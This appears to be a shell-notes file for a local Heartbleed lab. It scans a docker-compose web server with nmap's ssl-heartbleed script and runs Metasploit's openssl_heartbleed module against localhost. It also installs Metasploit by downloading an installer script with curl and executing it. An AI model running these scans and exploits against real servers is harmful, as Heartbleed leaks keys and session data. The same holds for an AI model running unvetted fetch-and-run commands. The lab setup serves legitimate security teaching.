# Start web server
docker-compose up -d web-server

# Scan web server using nmap from the local machine
sudo nmap -sV -p 8443 --script=ssl-heartbleed 127.0.0.1


# Scan heartbleed vulnerability from the attacker container
wget https://svn.nmap.org/nmap/scripts/ssl-heartbleed.nse
docker run --rm -it instrumentisto/nmap -sV -p 8443 --script=ssl-heartbleed 127.0.0.1
docker run --rm -it instrumentisto/nmap -sV -p 8443 --script ./ssl-heartbleed 127.0.0.1


# Run Metasploit console in a container
docker run --rm -it metasploitframework/metasploit-framework ./msfconsole

use auxiliary/scanner/ssl/openssl_heartbleed
set VERBOSE true
set RHOSTS web-server
set RPORT 443
exploit


# Install Metasploit on Linux / macOS (AWS Ubuntu)
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
  chmod 755 msfinstall && \
  ./msfinstall
# Run Metasploit on Linux / macOS (AWS Ubuntu)
msfconsole
# From there, the program will ask you a couple of questions and will ask for a username and
# password. From there, the program will successfully start and we can get down to business.
# We will input the following to setup our program to target for the Heartbleed bug:
use auxiliary/scanner/ssl/openssl_heartbleed
set VERBOSE true
set RHOSTS 127.0.0.1
set RPORT 8443
exploit








# No longer needed: start the attacker container image
docker compose run attacker bash
# Or
docker-compose run attacker bash

